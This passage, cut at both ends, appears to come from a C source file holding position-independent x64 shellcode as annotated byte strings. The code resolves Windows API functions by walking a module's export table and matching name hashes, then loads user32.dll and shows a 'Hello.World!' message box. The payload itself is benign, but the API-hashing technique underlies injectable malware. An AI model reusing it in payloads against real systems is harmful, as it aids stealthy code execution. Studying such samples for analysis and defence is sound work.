\"\\x48\\xc7\\x84\\x24\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" /* mov qword [rsp+0x80], 0x0                */\n\t/* 001C */ \"\\x48\\xc7\\x84\\x24\\xa8\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" /* mov qword [rsp+0xa8], 0x0                */\n\t/* 0028 */ \"\\xb8\\x75\\x00\\x00\\x00\"                             /* mov eax, 0x75                            */\n\t/* 002D */ \"\\x66\\x89\\x44\\x24\\x58\"                             /* mov [rsp+0x58], ax                       */\n\t/* 0032 */ \"\\xb8\\x73\\x00\\x00\\x00\"                             /* mov eax, 0x73                            */\n\t/* 0037 */ \"\\x66\\x89\\x44\\x24\\x5a\"                             /* mov [rsp+0x5a], ax                       */\n\t/* 003C */ \"\\xb8\\x65\\x00\\x00\\x00\"                             /* mov eax, 0x65                            */\n\t/* 0041 */ \"\\x66\\x89\\x44\\x24\\x5c\"                             /* mov [rsp+0x5c], ax                       */\n\t/* 0046 */ \"\\xb8\\x72\\x00\\x00\\x00\"                             /* mov eax, 0x72                            */\n\t/* 004B */ \"\\x66\\x89\\x44\\x24\\x5e\"                             /* mov [rsp+0x5e], ax                       */\n\t/* 0050 */ \"\\xb8\\x33\\x00\\x00\\x00\"                             /* mov eax, 0x33                            */\n\t/* 0055 */ \"\\x66\\x89\\x44\\x24\\x60\"                             /* mov [rsp+0x60], ax                       */\n\t/* 005A */ \"\\xb8\\x32\\x00\\x00\\x00\"                             /* mov eax, 0x32                            */\n\t/* 005F */ \"\\x66\\x89\\x44\\x24\\x62\"                             /* mov [rsp+0x62], ax                       */\n\t/* 0064 */ \"\\xb8\\x2e\\x00\\x00\\x00\"                             /* mov eax, 0x2e                            */\n\t/* 0069 */ \"\\x66\\x89\\x44\\x24\\x64\"                             /* mov [rsp+0x64], ax                       */\n\t/* 006E */ \"\\xb8\\x64\\x00\\x00\\x00\"                             /* mov eax, 0x64                            */\n\t/* 0073 */ \"\\x66\\x89\\x44\\x24\\x66\"                             /* mov [rsp+0x66], ax                       */\n\t/* 0078 */ \"\\xb8\\x6c\\x00\\x00\\x00\"                             /* mov eax, 0x6c                            */\n\t/* 007D */ \"\\x66\\x89\\x44\\x24\\x68\"                             /* mov [rsp+0x68], ax                       */\n\t/* 0082 */ \"\\xb8\\x6c\\x00\\x00\\x00\"                             /* mov eax, 0x6c                            */\n\t/* 0087 */ \"\\x66\\x89\\x44\\x24\\x6a\"                             /* mov [rsp+0x6a], ax                       */\n\t/* 008C */ \"\\x33\\xc0\"                                         /* xor eax, eax                             */\n\t/* 008E */ \"\\x66\\x89\\x44\\x24\\x6c\"                             /* mov [rsp+0x6c], ax                       */\n\t/* 0093 */ \"\\xc6\\x44\\x24\\x30\\x4d\"                             /* mov byte [rsp+0x30], 0x4d                */\n\t/* 0098 */ \"\\xc6\\x44\\x24\\x31\\x65\"                             /* mov byte [rsp+0x31], 0x65                */\n\t/* 009D */ \"\\xc6\\x44\\x24\\x32\\x73\"                             /* mov byte [rsp+0x32], 0x73                */\n\t/* 00A2 */ \"\\xc6\\x44\\x24\\x33\\x73\"                             /* mov byte [rsp+0x33], 0x73                */\n\t/* 00A7 */ \"\\xc6\\x44\\x24\\x34\\x61\"                             /* mov byte [rsp+0x34], 0x61                */\n\t/* 00AC */ \"\\xc6\\x44\\x24\\x35\\x67\"                             /* mov byte [rsp+0x35], 0x67                */\n\t/* 00B1 */ \"\\xc6\\x44\\x24\\x36\\x65\"                             /* mov byte [rsp+0x36], 0x65                */\n\t/* 00B6 */ \"\\xc6\\x44\\x24\\x37\\x42\"                             /* mov byte [rsp+0x37], 0x42                */\n\t/* 00BB */ \"\\xc6\\x44\\x24\\x38\\x6f\"                             /* mov byte [rsp+0x38], 0x6f                */\n\t/* 00C0 */ \"\\xc6\\x44\\x24\\x39\\x78\"                             /* mov byte [rsp+0x39], 0x78                */\n\t/* 00C5 */ \"\\xc6\\x44\\x24\\x3a\\x41\"                             /* mov byte [rsp+0x3a], 0x41                */\n\t/* 00CA */ \"\\xc6\\x44\\x24\\x3b\\x00\"                             /* mov byte [rsp+0x3b], 0x0                 */\n\t/* 00CF */ \"\\xc6\\x44\\x24\\x40\\x48\"                             /* mov byte [rsp+0x40], 0x48                */\n\t/* 00D4 */ \"\\xc6\\x44\\x24\\x41\\x65\"                             /* mov byte [rsp+0x41], 0x65                */\n\t/* 00D9 */ \"\\xc6\\x44\\x24\\x42\\x6c\"                             /* mov byte [rsp+0x42], 0x6c                */\n\t/* 00DE */ \"\\xc6\\x44\\x24\\x43\\x6c\"                             /* mov byte [rsp+0x43], 0x6c                */\n\t/* 00E3 */ \"\\xc6\\x44\\x24\\x44\\x6f\"                             /* mov byte [rsp+0x44], 0x6f                */\n\t/* 00E8 */ \"\\xc6\\x44\\x24\\x45\\x2e\"                             /* mov byte [rsp+0x45], 0x2e                */\n\t/* 00ED */ \"\\xc6\\x44\\x24\\x46\\x57\"                             /* mov byte [rsp+0x46], 0x57                */\n\t/* 00F2 */ \"\\xc6\\x44\\x24\\x47\\x6f\"                             /* mov byte [rsp+0x47], 0x6f                */\n\t/* 00F7 */ \"\\xc6\\x44\\x24\\x48\\x6c\"                             /* mov byte [rsp+0x48], 0x6c                */\n\t/* 00FC */ \"\\xc6\\x44\\x24\\x49\\x72\"                             /* mov byte [rsp+0x49], 0x72                */\n\t/* 0101 */ \"\\xc6\\x44\\x24\\x4a\\x64\"                             /* mov byte [rsp+0x4a], 0x64                */\n\t/* 0106 */ \"\\xc6\\x44\\x24\\x4b\\x21\"                             /* mov byte [rsp+0x4b], 0x21                */\n\t/* 010B */ \"\\xc6\\x44\\x24\\x4c\\x00\"                             /* mov byte [rsp+0x4c], 0x0                 */\n\t/* 0110 */ \"\\xe8\\x3b\\x05\\x00\\x00\"                             /* call 0x650                               */\n\t/* 0115 */ \"\\x48\\x89\\x84\\x24\\x88\\x00\\x00\\x00\"                 /* mov [rsp+0x88], rax                      */\n\t/* 011D */ \"\\x48\\x83\\xbc\\x24\\x88\\x00\\x00\\x00\\xff\"             /* cmp qword [rsp+0x88], 0xffffffffffffffff */\n\t/* 0126 */ \"\\x75\\x05\"                                         /* jnz 0x12d                                */\n\t/* 0128 */ \"\\xe9\\xd9\\x01\\x00\\x00\"                             /* jmp 0x306                                */\n\t/* 012D */ \"\\x48\\x8b\\x84\\x24\\x88\\x00\\x00\\x00\"                 /* mov rax, [rsp+0x88]                      */\n\t/* 0135 */ \"\\x48\\x89\\x44\\x24\\x28\"                             /* mov [rsp+0x28], rax                      */\n\t/* 013A */ \"\\x48\\x8b\\x44\\x24\\x28\"                             /* mov rax, [rsp+0x28]                      */\n\t/* 013F */ \"\\x48\\x89\\x84\\x24\\xb0\\x00\\x00\\x00\"                 /* mov [rsp+0xb0], rax                      */\n\t/* 0147 */ \"\\x48\\x8b\\x84\\x24\\xb0\\x00\\x00\\x00\"                 /* mov rax, [rsp+0xb0]                      */\n\t/* 014F */ \"\\x48\\x63\\x40\\x3c\"                                 /* movsxd rax, dword [rax+0x3c]             */\n\t/* 0153 */ \"\\x48\\x8b\\x4c\\x24\\x28\"                             /* mov rcx, [rsp+0x28]                      */\n\t/* 0158 */ \"\\x48\\x03\\xc8\"                                     /* add rcx, rax                             */\n\t/* 015B */ \"\\x48\\x8b\\xc1\"                                     /* mov rax, rcx                             */\n\t/* 015E */ \"\\x48\\x89\\x84\\x24\\xb8\\x00\\x00\\x00\"                 /* mov [rsp+0xb8], rax                      */\n\t/* 0166 */ \"\\xb8\\x08\\x00\\x00\\x00\"                             /* mov eax, 0x8                             */\n\t/* 016B */ \"\\x48\\x6b\\xc0\\x00\"                                 /* imul rax, rax, 0x0                       */\n\t/* 016F */ \"\\x48\\x8b\\x8c\\x24\\xb8\\x00\\x00\\x00\"                 /* mov rcx, [rsp+0xb8]                      */\n\t/* 0177 */ \"\\x8b\\x84\\x01\\x88\\x00\\x00\\x00\"                     /* mov eax, [rcx+rax+0x88]                  */\n\t/* 017E */ \"\\x48\\x8b\\x4c\\x24\\x28\"                             /* mov rcx, [rsp+0x28]                      */\n\t/* 0183 */ \"\\x48\\x03\\xc8\"                                     /* add rcx, rax                             */\n\t/* 0186 */ \"\\x48\\x8b\\xc1\"                                     /* mov rax, rcx                             */\n\t/* 0189 */ \"\\x48\\x89\\x44\\x24\\x50\"                             /* mov [rsp+0x50], rax                      */\n\t/* 018E */ \"\\x48\\x8b\\x44\\x24\\x50\"                             /* mov rax, [rsp+0x50]                      */\n\t/* 0193 */ \"\\x8b\\x40\\x20\"                                     /* mov eax, [rax+0x20]                      */\n\t/* 0196 */ \"\\x48\\x8b\\x4c\\x24\\x28\"                             /* mov rcx, [rsp+0x28]                      */\n\t/* 019B */ \"\\x48\\x03\\xc8\"                                     /* add rcx, rax                             */\n\t/* 019E */ \"\\x48\\x8b\\xc1\"                                     /* mov rax, rcx                             */\n\t/* 01A1 */ \"\\x48\\x89\\x84\\x24\\xc0\\x00\\x00\\x00\"                 /* mov [rsp+0xc0], rax                      */\n\t/* 01A9 */ \"\\x48\\x8b\\x44\\x24\\x50\"                             /* mov rax, [rsp+0x50]                      */\n\t/* 01AE */ \"\\x8b\\x40\\x1c\"                                     /* mov eax, [rax+0x1c]                      */\n\t/* 01B1 */ \"\\x48\\x8b\\x4c\\x24\\x28\"                             /* mov rcx, [rsp+0x28]                      */\n\t/* 01B6 */ \"\\x48\\x03\\xc8\"                                     /* add rcx, rax                             */\n\t/* 01B9 */ \"\\x48\\x8b\\xc1\"                                     /* mov rax, rcx                             */\n\t/* 01BC */ \"\\x48\\x89\\x84\\x24\\xa0\\x00\\x00\\x00\"                 /* mov [rsp+0xa0], rax                      */\n\t/* 01C4 */ \"\\x48\\x8b\\x44\\x24\\x50\"                             /* mov rax, [rsp+0x50]                      */\n\t/* 01C9 */ \"\\x8b\\x40\\x24\"                                     /* mov eax, [rax+0x24]                      */\n\t/* 01CC */ \"\\x48\\x8b\\x4c\\x24\\x28\"                             /* mov rcx, [rsp+0x28]                      */\n\t/* 01D1 */ \"\\x48\\x03\\xc8\"                                     /* add rcx, rax                             */\n\t/* 01D4 */ \"\\x48\\x8b\\xc1\"                                     /* mov rax, rcx                             */\n\t/* 01D7 */ \"\\x48\\x89\\x84\\x24\\x98\\x00\\x00\\x00\"                 /* mov [rsp+0x98], rax                      */\n\t/* 01DF */ \"\\xc7\\x44\\x24\\x74\\x88\\xef\\xff\\x6f\"                 /* mov dword [rsp+0x74], 0x6fffef88         */\n\t/* 01E7 */ \"\\xc7\\x44\\x24\\x70\\x7e\\xaa\\x8a\\x3f\"                 /* mov dword [rsp+0x70], 0x3f8aaa7e         */\n\t/* 01EF */ \"\\xc7\\x44\\x24\\x20\\x00\\x00\\x00\\x00\"                 /* mov dword [rsp+0x20], 0x0                */\n\t/* 01F7 */ \"\\xeb\\x0a\"                                         /* jmp 0x203                                */\n\t/* 01F9 */ \"\\x8b\\x44\\x24\\x20\"                                 /* mov eax, [rsp+0x20]                      */\n\t/* 01FD */ \"\\xff\\xc0\"                                         /* inc eax                                  */\n\t/* 01FF */ \"\\x89\\x44\\x24\\x20\"                                 /* mov [rsp+0x20], eax                      */\n\t/* 0203 */ \"\\x48\\x8b\\x44\\x24\\x50\"                             /* mov rax, [rsp+0x50]                      */\n\t/* 0208 */ \"\\x8b\\x40\\x18\"                                     /* mov eax, [rax+0x18]                      */\n\t/* 020B */ \"\\x39\\x44\\x24\\x20\"                                 /* cmp [rsp+0x20], eax                      */\n\t/* 020F */ \"\\x0f\\x83\\xf1\\x00\\x00\\x00\"                         /* jae 0x306                                */\n\t/* 0215 */ \"\\x8b\\x44\\x24\\x20\"                                 /* mov eax, [rsp+0x20]                      */\n\t/* 0219 */ \"\\x48\\x8b\\x8c\\x24\\xc0\\x00\\x00\\x00\"                 /* mov rcx, [rsp+0xc0]                      */\n\t/* 0221 */ \"\\x8b\\x04\\x81\"                                     /* mov eax, [rcx+rax*4]                     */\n\t/* 0224 */ \"\\x48\\x8b\\x4c\\x24\\x28\"                             /* mov rcx, [rsp+0x28]                      */\n\t/* 0229 */ \"\\x48\\x03\\xc8\"                                     /* add rcx, rax                             */\n\t/* 022C */ \"\\x48\\x8b\\xc1\"                                     /* mov rax, rcx                             */\n\t/* 022F */ \"\\x48\\x89\\x84\\x24\\x90\\x00\\x00\\x00\"                 /* mov [rsp+0x90], rax                      */\n\t/* 0237 */ \"\\x48\\x8b\\x8c\\x24\\x90\\x00\\x00\\x00\"                 /* mov rcx, [rsp+0x90]                      */\n\t/* 023F */ \"\\xe8\\xac\\x03\\x00\\x00\"                             /* call 0x5f0                               */\n\t/* 0244 */ \"\\x3b\\x44\\x24\\x70\"                                 /* cmp eax, [rsp+0x70]                      */\n\t/* 0248 */ \"\\x75\\x30\"                                         /* jnz 0x27a                                */\n\t/* 024A */ \"\\x8b\\x44\\x24\\x20\"                                 /* mov eax, [rsp+0x20]                      */\n\t/* 024E */ \"\\x48\\x8b\\x8c\\x24\\x98\\x00\\x00\\x00\"                 /* mov rcx, [rsp+0x98]                      */\n\t/* 0256 */ \"\\x0f\\xb7\\x04\\x41\"                                 /* movzx eax, word [rcx+rax*2]              */\n\t/* 025A */ \"\\x48\\x8b\\x8c\\x24\\xa0\\x00\\x00\\x00\"                 /* mov rcx, [rsp+0xa0]                      */\n\t/* 0262 */ \"\\x8b\\x04\\x81\"                                     /* mov eax, [rcx+rax*4]                     */\n\t/* 0265 */ \"\\x48\\x8b\\x4c\\x24\\x28\"                             /* mov rcx, [rsp+0x28]                      */\n\t/* 026A */ \"\\x48\\x03\\xc8\"                                     /* add rcx, rax                             */\n\t/* 026D */ \"\\x48\\x8b\\xc1\"                                     /* mov rax, rcx                             */\n\t/* 0270 */ \"\\x48\\x89\\x84\\x24\\x80\\x00\\x00\\x00\"                 /* mov [rsp+0x80], rax                      */\n\t/* 0278 */ \"\\xeb\\x3e\"                                         /* jmp 0x2b8                                */\n\t/* 027A */ \"\\x48\\x8b\\x8c\\x24\\x90\\x00\\x00\\x00\"                 /* mov rcx, [rsp+0x90]                      */\n\t/* 0282 */ \"\\xe8\\x69\\x03\\x00\\x00\"                             /* call 0x5f0                               */\n\t/* 0287 */ \"\\x3b\\x44\\x24\\x74\"                                 /* cmp eax, [rsp+0x74]                      */\n\t/* 028B */ \"\\x75\\x2b\"                                         /* jnz 0x2b8                                */\n\t/* 028D */ \"\\x8b\\x44\\x24\\x20\"                                 /* mov eax, [rsp+0x20]                      */\n\t/* 0291 */ \"\\x48\\x8b\\x8c\\x24\\x98\\x00\\x00\\x00\"                 /* mov rcx, [rsp+0x98]                      */\n\t/* 0299 */ \"\\x0f\\xb7\\x04\\x41\"                                 /* movzx eax, word [rcx+rax*2]              */\n\t/* 029D */ \"\\x48\\x8b\\x8c\\x24\\xa0\\x00\\x00\\x00\"                 /* mov rcx, [rsp+0xa0]                      */\n\t/* 02A5 */ \"\\x8b\\x04\\x81\"                                     /* mov eax, [rcx+rax*4]                     */\n\t/* 02A8 */ \"\\x48\\x8b\\x4c\\x24\\x28\"                             /* mov rcx, [rsp+0x28]                      */\n\t/* 02AD */ \"\\x48\\x03\\xc8\"                                     /* add rcx, rax                             */\n\t/* 02B0 */ \"\\x48\\x8b\\xc1\"                                     /* mov rax, rcx                             */\n\t/* 02B3 */ \"\\x48\\x89\\x44\\x24\\x78\"                             /* mov [rsp+0x78], rax                      */\n\t/* 02B8 */ \"\\x48\\x83\\xbc\\x24\\x80\\x00\\x00\\x00\\x00\"             /* cmp qword [rsp+0x80], 0x0                */\n\t/* 02C1 */ \"\\x74\\x3e\"                                         /* jz 0x301                                 */\n\t/* 02C3 */ \"\\x48\\x83\\x7c\\x24\\x78\\x00\"                         /* cmp qword [rsp+0x78], 0x0                */\n\t/* 02C9 */ \"\\x74\\x36\"                                         /* jz 0x301                                 */\n\t/* 02CB */ \"\\x48\\x8d\\x4c\\x24\\x58\"                             /* lea rcx, [rsp+0x58]                      */\n\t/* 02D0 */ \"\\xff\\x54\\x24\\x78\"                                 /* call qword [rsp+0x78]                    */\n\t/* 02D4 */ \"\\x48\\x8d\\x54\\x24\\x30\"                             /* lea rdx, [rsp+0x30]                      */\n\t/* 02D9 */ \"\\x48\\x8b\\xc8\"                                     /* mov rcx, rax                             */\n\t/* 02DC */ \"\\xff\\x94\\x24\\x80\\x00\\x00\\x00\"                     /* call qword [rsp+0x80]                    */\n\t/* 02E3 */ \"\\x48\\x89\\x84\\x24\\xa8\\x00\\x00\\x00\"                 /* mov [rsp+0xa8], rax                      */\n\t/* 02EB */ \"\\x45\\x33\\xc9\"                                     /* xor r9d, r9d                             */\n\t/* 02EE */ \"\\x45\\x33\\xc0\"                                     /* xor r8d, r8d                             */\n\t/* 02F1 */ \"\\x48\\x8d\\x54\\x24\\x40\"                             /* lea rdx, [rsp+0x40]                      */\n\t/* 02F6 */ \"\\x33\\xc9\"                                         /* xor ecx, ecx                             */\n\t/* 02F8 */ \"\\xff\\x94\\x24\\xa8\\x00\\x00\\x00\"                     /* call qword [rsp+0xa8]                    */\n\t/* 02FF */ \"\\xeb\\x05\"                                         /* jmp 0x306                                */\n\t/* 0301 */ \"\\xe9\\xf3\\xfe\\xff\\xff\"                             /* jmp 0x1f9                                */\n\t/* 0306 */ \"\\x48\\x81\\xc4\\xd8\\x00\\x00\\x00\"                     /* add rsp, 0xd8                            */\n\t/* 030D */ \"\\xc3\"                                             /* ret                                      */\n\t/* 030E */ \"\\xcc\"                                             /* int3                                     */\n\t/* 030F */ \"\\xcc\"                                             /* int3                                     */\n\t/* 0310 */ \"\\x88\\x4c\\x24\\x08\"                                 /* mov [rsp+0x8], cl                        */\n\t/* 0314 */ \"\\x48\\x83\\xec\\x18\"                                 /* sub rsp, 0x18                            */\n\t/* 0318 */ \"\\x0f\\xbe\\x44\\x24\\x20\"                             /* movsx eax, byte [rsp+0x20]               */\n\t/* 031D */ \"\\x83\\xf8\\x41\"                                     /* cmp eax, 0x41                            */\n\t/* 0320 */ \"\\x7c\\x13\"                                         /* jl 0x335                                 */\n\t/* 0322 */ \"\\x0f\\xbe\\x44\\x24\\x20\"                             /* movsx eax, byte [rsp+0x20]               */\n\t/* 0327 */ \"\\x83\\xf8\\x5a\"                                     /* cmp eax, 0x5a                            */\n\t/* 032A */ \"\\x7f\\x09\"                                         /* jg 0x335                                 */\n\t/* 032C */ \"\\xc7\\x04\\x24\\x01\\x00\\x00\\x00\"                     /* mov dword [rsp], 0x1                     */\n\t/* 0333 */ \"\\xeb\\x07\"                                         /* jmp 0x33c                                */\n\t/* 0335 */ \"\\xc7\\x04\\x24\\x00\\x00\\x00\\x00\"                     /* mov dword [rsp], 0x0                     */\n\t/* 033C */ \"\\x8b\\x04\\x24\"                                     /* mov eax, [rsp]                           */\n\t/* 033F */ \"\\x48\\x83\\xc4\\x18\"                                 /* add rsp, 0x18                            */\n\t/* 0343 */ \"\\xc3\"                                             /* ret                                      */\n\t/* 0344 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 0345 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 0346 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 0347 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 0348 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 0349 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 034A */ \"\\xcc\"                                             /* int3                                     */\n\t/* 034B */ \"\\xcc\"                                             /* int3                                     */\n\t/* 034C */ \"\\xcc\"                                             /* int3                                     */\n\t/* 034D */ \"\\xcc\"                                             /* int3                                     */\n\t/* 034E */ \"\\xcc\"                                             /* int3                                     */\n\t/* 034F */ \"\\xcc\"                                             /* int3                                     */\n\t/* 0350 */ \"\\x88\\x4c\\x24\\x08\"                                 /* mov [rsp+0x8], cl                        */\n\t/* 0354 */ \"\\x48\\x83\\xec\\x38\"                                 /* sub rsp, 0x38                            */\n\t/* 0358 */ \"\\x0f\\xb6\\x4c\\x24\\x40\"                             /* movzx ecx, byte [rsp+0x40]               */\n\t/* 035D */ \"\\xe8\\xae\\xff\\xff\\xff\"                             /* call 0x310                               */\n\t/* 0362 */ \"\\x85\\xc0\"                                         /* test eax, eax                            */\n\t/* 0364 */ \"\\x74\\x0e\"                                         /* jz 0x374                                 */\n\t/* 0366 */ \"\\x0f\\xbe\\x44\\x24\\x40\"                             /* movsx eax, byte [rsp+0x40]               */\n\t/* 036B */ \"\\x83\\xc0\\x20\"                                     /* add eax, 0x20                            */\n\t/* 036E */ \"\\x89\\x44\\x24\\x20\"                                 /* mov [rsp+0x20], eax                      */\n\t/* 0372 */ \"\\xeb\\x09\"                                         /* jmp 0x37d                                */\n\t/* 0374 */ \"\\x0f\\xbe\\x44\\x24\\x40\"                             /* movsx eax, byte [rsp+0x40]               */\n\t/* 0379 */ \"\\x89\\x44\\x24\\x20\"                                 /* mov [rsp+0x20], eax                      */\n\t/* 037D */ \"\\x0f\\xb6\\x44\\x24\\x20\"                             /* movzx eax, byte [rsp+0x20]               */\n\t/* 0382 */ \"\\x48\\x83\\xc4\\x38\"                                 /* add rsp, 0x38                            */\n\t/* 0386 */ \"\\xc3\"                                             /* ret                                      */\n\t/* 0387 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 0388 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 0389 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 038A */ \"\\xcc\"                                             /* int3                                     */\n\t/* 038B */ \"\\xcc\"                                             /* int3                                     */\n\t/* 038C */ \"\\xcc\"                                             /* int3                                     */\n\t/* 038D */ \"\\xcc\"                                             /* int3                                     */\n\t/* 038E */ \"\\xcc\"                                             /* int3                                     */\n\t/* 038F */ \"\\xcc\"                                             /* int3                                     */\n\t/* 0390 */ \"\\x48\\x89\\x4c\\x24\\x08\"                             /* mov [rsp+0x8], rcx                       */\n\t/* 0395 */ \"\\x48\\x83\\xec\\x18\"                                 /* sub rsp, 0x18                            */\n\t/* 0399 */ \"\\xc7\\x04\\x24\\x00\\x00\\x00\\x00\"                     /* mov dword [rsp], 0x0                     */\n\t/* 03A0 */ \"\\x8b\\x04\\x24\"                                     /* mov eax, [rsp]                           */\n\t/* 03A3 */ \"\\x48\\x8b\\x4c\\x24\\x20\"                             /* mov rcx, [rsp+0x20]                      */\n\t/* 03A8 */ \"\\x0f\\xb7\\x04\\x41\"                                 /* movzx eax, word [rcx+rax*2]              */\n\t/* 03AC */ \"\\x85\\xc0\"                                         /* test eax, eax                            */\n\t/* 03AE */ \"\\x74\\x0a\"                                         /* jz 0x3ba                                 */\n\t/* 03B0 */ \"\\x8b\\x04\\x24\"                                     /* mov eax, [rsp]                           */\n\t/* 03B3 */ \"\\xff\\xc0\"                                         /* inc eax                                  */\n\t/* 03B5 */ \"\\x89\\x04\\x24\"                                     /* mov [rsp], eax                           */\n\t/* 03B8 */ \"\\xeb\\xe6\"                                         /* jmp 0x3a0                                */\n\t/* 03BA */ \"\\x8b\\x04\\x24\"                                     /* mov eax, [rsp]                           */\n\t/* 03BD */ \"\\x48\\x83\\xc4\\x18\"                                 /* add rsp, 0x18                            */\n\t/* 03C1 */ \"\\xc3\"                                             /* ret                                      */\n\t/* 03C2 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 03C3 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 03C4 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 03C5 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 03C6 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 03C7 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 03C8 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 03C9 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 03CA */ \"\\xcc\"                                             /* int3                                     */\n\t/* 03CB */ \"\\xcc\"                                             /* int3                                     */\n\t/* 03CC */ \"\\xcc\"                                             /* int3                                     */\n\t/* 03CD */ \"\\xcc\"                                             /* int3                                     */\n\t/* 03CE */ \"\\xcc\"                                             /* int3                                     */\n\t/* 03CF */ \"\\xcc\"                                             /* int3                                     */\n\t/* 03D0 */ \"\\x48\\x89\\x54\\x24\\x10\"                             /* mov [rsp+0x10], rdx                      */\n\t/* 03D5 */ \"\\x48\\x89\\x4c\\x24\\x08\"                             /* mov [rsp+0x8], rcx                       */\n\t/* 03DA */ \"\\x48\\x83\\xec\\x38\"                                 /* sub rsp, 0x38                            */\n\t/* 03DE */ \"\\xb8\\x01\\x00\\x00\\x00\"                             /* mov eax, 0x1                             */\n\t/* 03E3 */ \"\\x48\\x6b\\xc0\\x00\"                                 /* imul rax, rax, 0x0                       */\n\t/* 03E7 */ \"\\x48\\x8b\\x4c\\x24\\x48\"                             /* mov rcx, [rsp+0x48]                      */\n\t/* 03EC */ \"\\x0f\\xb6\\x04\\x01\"                                 /* movzx eax, byte [rcx+rax]                */\n\t/* 03F0 */ \"\\x88\\x44\\x24\\x22\"                                 /* mov [rsp+0x22], al                       */\n\t/* 03F4 */ \"\\x0f\\xb6\\x4c\\x24\\x22\"                             /* movzx ecx, byte [rsp+0x22]               */\n\t/* 03F9 */ \"\\xe8\\x52\\xff\\xff\\xff\"                             /* call 0x350                               */\n\t/* 03FE */ \"\\x88\\x44\\x24\\x21\"                                 /* mov [rsp+0x21], al                       */\n\t/* 0402 */ \"\\x48\\x8b\\x44\\x24\\x48\"                             /* mov rax, [rsp+0x48]                      */\n\t/* 0407 */ \"\\x48\\x83\\xc0\\x02\"                                 /* add rax, 0x2                             */\n\t/* 040B */ \"\\x48\\x89\\x44\\x24\\x48\"                             /* mov [rsp+0x48], rax                      */\n\t/* 0410 */ \"\\x0f\\xbe\\x44\\x24\\x21\"                             /* movsx eax, byte [rsp+0x21]               */\n\t/* 0415 */ \"\\x85\\xc0\"                                         /* test eax, eax                            */\n\t/* 0417 */ \"\\x75\\x07\"                                         /* jnz 0x420                                */\n\t/* 0419 */ \"\\x48\\x8b\\x44\\x24\\x40\"                             /* mov rax, [rsp+0x40]                      */\n\t/* 041E */ \"\\xeb\\x7c\"                                         /* jmp 0x49c                                */\n\t/* 0420 */ \"\\x48\\x8b\\x4c\\x24\\x48\"                             /* mov rcx, [rsp+0x48]                      */\n\t/* 0425 */ \"\\xe8\\x66\\xff\\xff\\xff\"                             /* call 0x390                               */\n\t/* 042A */ \"\\x89\\x44\\x24\\x24\"                                 /* mov [rsp+0x24], eax                      */\n\t/* 042E */ \"\\xb8\\x01\\x00\\x00\\x00\"                             /* mov eax, 0x1                             */\n\t/* 0433 */ \"\\x48\\x6b\\xc0\\x00\"                                 /* imul rax, rax, 0x0                       */\n\t/* 0437 */ \"\\x48\\x8b\\x4c\\x24\\x40\"                             /* mov rcx, [rsp+0x40]                      */\n\t/* 043C */ \"\\x0f\\xb6\\x04\\x01\"                                 /* movzx eax, byte [rcx+rax]                */\n\t/* 0440 */ \"\\x88\\x44\\x24\\x23\"                                 /* mov [rsp+0x23], al                       */\n\t/* 0444 */ \"\\x0f\\xb6\\x4c\\x24\\x23\"                             /* movzx ecx, byte [rsp+0x23]               */\n\t/* 0449 */ \"\\xe8\\x02\\xff\\xff\\xff\"                             /* call 0x350                               */\n\t/* 044E */ \"\\x88\\x44\\x24\\x20\"                                 /* mov [rsp+0x20], al                       */\n\t/* 0452 */ \"\\x48\\x8b\\x44\\x24\\x40\"                             /* mov rax, [rsp+0x40]                      */\n\t/* 0457 */ \"\\x48\\x83\\xc0\\x02\"                                 /* add rax, 0x2                             */\n\t/* 045B */ \"\\x48\\x89\\x44\\x24\\x40\"                             /* mov [rsp+0x40], rax                      */\n\t/* 0460 */ \"\\x0f\\xbe\\x44\\x24\\x20\"                             /* movsx eax, byte [rsp+0x20]               */\n\t/* 0465 */ \"\\x85\\xc0\"                                         /* test eax, eax                            */\n\t/* 0467 */ \"\\x75\\x04\"                                         /* jnz 0x46d                                */\n\t/* 0469 */ \"\\x33\\xc0\"                                         /* xor eax, eax                             */\n\t/* 046B */ \"\\xeb\\x2f\"                                         /* jmp 0x49c                                */\n\t/* 046D */ \"\\x0f\\xbe\\x44\\x24\\x20\"                             /* movsx eax, byte [rsp+0x20]               */\n\t/* 0472 */ \"\\x0f\\xbe\\x4c\\x24\\x21\"                             /* movsx ecx, byte [rsp+0x21]               */\n\t/* 0477 */ \"\\x3b\\xc1\"                                         /* cmp eax, ecx                             */\n\t/* 0479 */ \"\\x75\\xb3\"                                         /* jnz 0x42e                                */\n\t/* 047B */ \"\\x44\\x8b\\x44\\x24\\x24\"                             /* mov r8d, [rsp+0x24]                      */\n\t/* 0480 */ \"\\x48\\x8b\\x54\\x24\\x48\"                             /* mov rdx, [rsp+0x48]                      */\n\t/* 0485 */ \"\\x48\\x8b\\x4c\\x24\\x40\"                             /* mov rcx, [rsp+0x40]                      */\n\t/* 048A */ \"\\xe8\\x21\\x00\\x00\\x00\"                             /* call 0x4b0                               */\n\t/* 048F */ \"\\x85\\xc0\"                                         /* test eax, eax                            */\n\t/* 0491 */ \"\\x75\\x9b\"                                         /* jnz 0x42e                                */\n\t/* 0493 */ \"\\x48\\x8b\\x44\\x24\\x40\"                             /* mov rax, [rsp+0x40]                      */\n\t/* 0498 */ \"\\x48\\x83\\xe8\\x02\"                                 /* sub rax, 0x2                             */\n\t/* 049C */ \"\\x48\\x83\\xc4\\x38\"                                 /* add rsp, 0x38                            */\n\t/* 04A0 */ \"\\xc3\"                                             /* ret                                      */\n\t/* 04A1 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 04A2 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 04A3 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 04A4 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 